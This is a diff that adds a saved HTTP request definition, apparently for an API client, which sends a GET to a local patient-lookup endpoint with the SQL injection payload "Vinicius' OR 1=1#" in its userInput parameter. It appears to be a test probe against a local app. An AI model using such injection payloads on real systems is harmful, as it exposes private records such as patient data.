@@ -1,0 +1,10 @@
+$kind: http-request
+url: http://localhost:3000/paciente/consulta-por-paciente?userInput=Vinicius'%20OR%201=1%23
+method: GET
+queryParams:
+  userInput: Vinicius'%20OR%201=1%23
+settings:
+  followRedirects: true
+  disableUrlEncoding: false
+  disableCookies: false
+order: 1000
